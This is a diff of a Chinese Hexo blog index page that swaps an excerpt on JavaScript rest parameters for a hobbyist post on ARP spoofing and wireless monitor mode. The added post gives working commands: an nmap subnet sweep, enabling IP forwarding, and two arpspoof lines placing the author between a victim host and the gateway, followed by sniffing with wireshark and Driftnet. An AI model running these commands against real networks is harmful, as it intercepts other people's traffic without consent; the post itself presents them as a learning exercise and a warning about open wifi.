@@ -267,143 +267,6 @@
             
               
                 
-                <a class="post-title-link" href="/2016/07/31/Underscore源码学习(三)/" itemprop="url">
-                  Underscore 源码学习(三)
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-31T14:37:31+08:00" content="2016-07-31">
-              2016-07-31
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Underscore/" itemprop="url" rel="index">
-                    <span itemprop="name">Underscore</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/07/31/Underscore源码学习(三)/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/31/Underscore源码学习(三)/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2016/07/31/Underscore源码学习(三)/" class="leancloud_visitors" data-flag-title="Underscore 源码学习(三)">
-               &nbsp; | &nbsp;
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               <span class="post-meta-item-text">阅读次数 </span>
-               <span class="leancloud-visitors-count"></span>
-              </span>
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>这次主要说剩余参数。<br>在 ES5 中，如果想要函数接收任意数量的参数，必须使用特殊变量 <code>arguments</code>，举个例子，我们要实现一个加法函数，要求第一个数乘2，然后与其他数相加。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> sum = <span class="built_in">arguments</span>[<span class="number">0</span>] * <span class="number">2</span>;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; <span class="built_in">arguments</span>.length; i++) &#123;</div><div class="line">        sum += <span class="built_in">arguments</span>[i];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> sum;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>在 ES6 中，我们可以使用 <code>...</code> 操作符，例如：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">first, ...args</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> sum = first*<span class="number">2</span>;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> arg <span class="keyword">of</span> args) &#123;</div><div class="line">        sum += arg;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> sum;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>使用 ES5 我们无法给函数定义参数，而只能通过 <code>arguments</code> 来获取参数，这样写明显带来了可读性的降低。而 ES6 我们就可以在函数声明里面写明参数，对于不定长的参数，则可以使用 <code>...</code> 操作符。<br><code>...</code> 还有另一个常用的应用场景，比如下面例子：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="built_in">arguments</span>);</div><div class="line">    <span class="built_in">console</span>.log(<span class="built_in">arguments</span> <span class="keyword">instanceof</span> <span class="built_in">Array</span>);</div><div class="line">    <span class="built_in">console</span>.log(<span class="built_in">arguments</span> <span class="keyword">instanceof</span> <span class="built_in">Object</span>);</div><div class="line">&#125;</div><div class="line">test(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</div><div class="line"><span class="comment">// Result:</span></div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</div><div class="line"><span class="literal">false</span></div><div class="line"><span class="literal">true</span></div></pre></td></tr></table></figure></p>
-<p>如果细看输出的[1, 2, 3]会发现他是这样的：<br><img src="/2016/07/31/Underscore源码学习(三)/result1.png" alt="result1.png" title="result1.png"><br>我们再试试下面的<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</div><div class="line"><span class="built_in">console</span>.log(arr);</div><div class="line"><span class="built_in">console</span>.log(arr <span class="keyword">instanceof</span> <span class="built_in">Array</span>);</div><div class="line"><span class="built_in">console</span>.log(arr <span class="keyword">instanceof</span> <span class="built_in">Object</span>);</div><div class="line"><span class="comment">// Result:</span></div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</div><div class="line"><span class="literal">true</span></div><div class="line"><span class="literal">true</span></div></pre></td></tr></table></figure></p>
-<p>再看下[1, 2, 3]这行输出里面是什么：<br><img src="/2016/07/31/Underscore源码学习(三)/result2.png" alt="result2.png" title="result2.png"><br>从 <code>instanceof</code> 我们就知道了 <code>arguments</code> 并不是真正的数组。伪数组实质是一个对象。<br>要把一个伪数组转为数组，可以这样用<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> arr = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>);</div></pre></td></tr></table></figure></p>
-<p>上面这种做法在很多地方都可以看到。除了上面这样做之外，我们还可以使用 ES6 的 <code>Array.from</code> 来处理，如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> arr = <span class="built_in">Array</span>.from(<span class="built_in">arguments</span>);</div></pre></td></tr></table></figure></p>
-<p>但在 ES6 中，我们使用 <code>...</code> 运算符并不存在这个问题，比如上面第二个例子，<code>args</code> 是一个数组。<br>鉴于此，我们应该尽量使用 ES6 剩余参数写法和 <code>Array.from</code> 的写法，因为这样更容易理解，而且写起来更简洁。<br>另外，我们还可以使用 <code>...</code> 操作符来复制数组，如下：<br>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/07/31/Underscore源码学习(三)/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
                 <a class="post-title-link" href="/2016/07/29/Underscore源码学习(二)/" itemprop="url">
                   Underscore 源码学习(二)
                 </a>
@@ -959,6 +822,145 @@
 
 
     
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/07/14/ARP攻击和无线网卡混杂模式/" itemprop="url">
+                  ARP 攻击和无线网卡混杂模式
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-07-14T12:32:41+08:00" content="2016-07-14">
+              2016-07-14
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/07/14/ARP攻击和无线网卡混杂模式/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/14/ARP攻击和无线网卡混杂模式/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2016/07/14/ARP攻击和无线网卡混杂模式/" class="leancloud_visitors" data-flag-title="ARP 攻击和无线网卡混杂模式">
+               &nbsp; | &nbsp;
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               <span class="post-meta-item-text">阅读次数 </span>
+               <span class="leancloud-visitors-count"></span>
+              </span>
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>一次小小的 Hack 尝试…<br>前段时间换上了 Arch，就开始想这捣鼓一些黑科技。脑海中立即浮现出两个词， monitor 和 ARP 。</p>
+<h2 id="ARP-攻击"><a href="#ARP-攻击" class="headerlink" title="ARP 攻击"></a>ARP 攻击</h2><p>学过计算机网络了，大概了解ARP攻击这么一回事，但是当我真正去试的时候，才发现局域网原来真的这么脆弱，因为进行ARP攻击实在太容易了。实际上就是几条命令的事情。</p>
+<h3 id="主机发现和端口扫描"><a href="#主机发现和端口扫描" class="headerlink" title="主机发现和端口扫描"></a>主机发现和端口扫描</h3><p>进行攻击第一步当然就是找目标了。可以使用 nmap 这个工具来进行，这东西简直渗透利器。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sP <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span></div></pre></td></tr></table></figure></p>
+<p> 这样就可以扫描192.168.1.0这个网段里面的所有主机了，以 ping 方式扫描，当然他有很多参数很多用法，网上很多这方面的资料我就不叙述了。<br><img src="/2016/07/14/ARP攻击和无线网卡混杂模式/nmap.png" alt="Nmap扫描" title="Nmap扫描"></p>
+<h3 id="发起攻击"><a href="#发起攻击" class="headerlink" title="发起攻击"></a>发起攻击</h3><p>如果是进行ARP攻击，那也是加多三条命令就搞定的事情。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</div><div class="line">arpspoof -i wlp3s0 -t 192.168.1.110 192.168.1.1</div><div class="line">arpspoof -i wlp3s0 -t 192.168.1.1   192.168.1.110</div></pre></td></tr></table></figure></p>
+<p>第一条是开启转发，不然会受害者流量到我们这里出不去就断网了。<br>第二条是告诉受害者说我是网管。<br>第三条是告诉网管我是受害者。<br>这样就完成了 ARP 欺骗，图片以后再补。这之后对方的网络就完全在你的监控之下了。这告诉我们使用 https 和不连接免费 wifi 的重要性!</p>
+<h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><p>抓包推荐使用 wireshark 。具体就不介绍了=.=。你还可以使用 Driftnet 这东西来将对方访问的图片在你这边显示出来～</p>
+<h2 id="监听空气包"><a href="#监听空气包" class="headerlink" title="监听空气包"></a>监听空气包</h2><p>大部分无线网卡都可以设置 monitor 模式，即无线网卡默认接受下全部经过他的以太网帧而不丢弃，这种方式可以抓到附近范围里面的所以以太网帧。在 Arch 下也是三条命令搞定的事情。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ifconfig wlp3s0 down</div><div class="line">iwconfig wlp3s0 mode monitor</div><div class="line">ifconfig wlp3s0 up</div></pre></td></tr></table></figure></p>
+<p>接着同样开启 wireshark 抓包，你会发现很多802.11帧，不过这个并没有什么卵用，理论上应该对于没有加密的帧应该可以直接得到应用层报文才对，但是很奇怪我一直抓不到，即使是对于有加密的 Wifi，我填入 WAPKEY 解密也不行。这个有待继续研究。。。<br>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/07/14/ARP攻击和无线网卡混杂模式/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
   </section>
 
   
@@ -1004,7 +1006,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">19</span>
+              <span class="site-state-item-count">18</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
